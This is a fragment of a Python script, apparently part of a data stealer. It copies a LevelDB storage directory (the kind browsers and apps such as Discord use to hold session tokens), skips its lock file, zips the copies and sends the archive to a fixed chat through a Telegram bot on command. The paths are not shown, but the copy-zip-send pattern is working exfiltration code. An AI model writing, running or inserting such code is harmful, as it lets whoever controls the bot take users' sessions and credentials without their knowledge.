
if not os.path.exists(leveldb_target_path):
    os.makedirs(leveldb_target_path)
for filename in os.listdir(leveldb_path):
    if filename == "LOOK":
        continue
    file_path = os.path.join(leveldb_path, filename)
    if os.path.isfile(file_path):
        try:
            shutil.copy(file_path, os.path.join(leveldb_target_path, filename))
            print(f"File {filename} copied successfully.")
        except Exception as e:
            print(f"An error occurred during copying {filename}: {e}")
with zipfile.ZipFile(parses_zip_path, 'w') as zipf:
    for root, _, files in os.walk(leveldb_target_path):
        for file in files:
            zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), leveldb_target_path))
@bot.message_handler(commands=['send_parses'])
def send_parses(message):
    with open(parses_zip_path, 'rb') as file:
        bot.send_document(chat_id, file)
bot.polling()
